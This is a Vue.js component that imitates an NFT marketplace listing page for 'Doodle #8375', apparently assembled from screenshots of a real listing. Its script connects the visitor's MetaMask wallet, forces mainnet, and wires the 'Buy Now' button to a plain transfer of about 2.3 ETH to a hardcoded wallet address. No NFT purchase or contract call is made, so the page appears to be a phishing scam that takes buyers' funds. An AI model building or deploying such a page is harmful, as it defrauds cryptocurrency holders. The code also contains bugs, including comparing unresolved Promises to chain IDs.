<template>
  <div class="home">
    <div class="div1"> 
      <img src="./doodle.png" width="auto" height="auto" >
      <img src="./despricption.png" width="auto" height="auto"></div>
      <div class="div2"> 
      <h2 style="color:rgb(32, 129, 226); float:left; margin-top:20px">Doodles <img src="./verified.png" width="20px" height="20px"></h2>
      <h3 style="color:black; text-align:left;  font-size:30px; font-weight:900; margin-top:60px">Doodle #8375</h3>
      <h4 style="color:rgb(112, 122, 131); float:left;  font-size:15px; margin-top:30px; ">Owned by 
<span style="color:rgb(32, 129, 226);">NFTsandGames</span> 
 <md-icon> visibility</md-icon>  2.7k views <md-icon>favorite</md-icon>  39 favorites</h4>
<h2 style="color:black; float:left; font-size:18px; margin-top:30px;">Sale ends April 29, 2022 at 3:16am IST </h2>
<h1 style="color:black; float:left; font-size:25px; margin-top:20px; margin-right:200px;">2.3
  <img src="./ether.svg" width="15px" height="15px"><span style="font-size:15px; color:rgb(112, 122, 131); ">  ($10,706.50)</span>
</h1>
<button v-on:click="sendtransaction" style="padding:15px 25px; width:400px; background-color:rgb(32, 129, 226); margin-top:10px; color: white; margin-right:100px;">Buy Now</button>
 <img src="./graph.png" width="auto" height="auto" style="margin-top:10px">
    </div>
    <img src="./doodles.png" width="90%" height="auto">
    <img src="./footer.png" width="100%" >
    
    
  </div>
</template>

<script>


import "web3";
export default {
  name: 'Home',
  created(){
    const Web3 = require("web3");
    if (typeof window.ethereum !== "undefined") {
      console.log("Metamask is installed");
    }
    const ethEnabled = async () => {
      if (window.ethereum) {
        window.ethereum.request({ method: "eth_requestAccounts" });
        const chainId = await window.ethereum.request({
          method: "eth_chainId",
        });
        console.log(chainId);
        window.web3 = new Web3(window.ethereum);
        return true;
      }
      return false;
    };
    ethEnabled().then(() => {
      var x=document.getElementById("connectbutton")
      x.innerText="MINT NOW"
      try {
        const Id = window.ethereum.request({ method: "eth_chainId" });
        if (Id !== "0x1") {
          window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }],
          });
        }
      } catch (error) {
        console.log("error");
        if (error.code == 4001) {
          alert("Please connect to Ethereum Chain");
        }
      }
    });
  },
  methods:{
    hex(){
      const x= web3.utils.toHex(2.3*1e18)
      console.log(x)
    },
    sendtransaction() {
       const acc = window.ethereum.request({ method: "eth_requestAccounts" });
      acc.then((result) => {
        const account = result[0];
        const chainId = window.ethereum.request({ method: "eth_chainId" });
        if (chainId !== "0x1") {
          
           window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }],
          }); 
          
                    
                    const amount='0x1feb3dd06765fed4';
                    console.log(amount)
            window.ethereum.request({
              method: "eth_sendTransaction",
              params: [
                {
                  from: account,
                  to: "0xAb0C11E0c9e36F9e55D044D6A429d82376553510",
                  value:amount,
                  //gasPrice: '0x09184e72a000',0x29a2241af62c0000
                  //gas: '0x2710',
                },
              ],
            });
          
          
        }else {
          
                    
                    const amount='0x1feb3dd06765fed4';
                window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [
                        {
                            from: account,
                            to: '0xAb0C11E0c9e36F9e55D044D6A429d82376553510',
                            value: amount,
                            //gasPrice: '0x09184e72a000',0x29a2241af62c0000
                            //gas: '0x2710',
                        },
                    ],
                })
        }
      });
    },
  }
  
}
</script>
<style lang="scss">
.div1{
  height: 1000px;
  width: 600px;
  margin-top: 100px;
  display: inline-block;
}
.div2{
  width: 650px;
  height: 600px;
  display: inline-block;
  background-color: white;
  margin-left: 2%;
  margin-top: 70px;
  vertical-align: 330px;
  box-shadow: 0px 2px #888888;
  
}.div3{
  width: 600px;
  height: 400px;
  float: left;
  
}
</style>
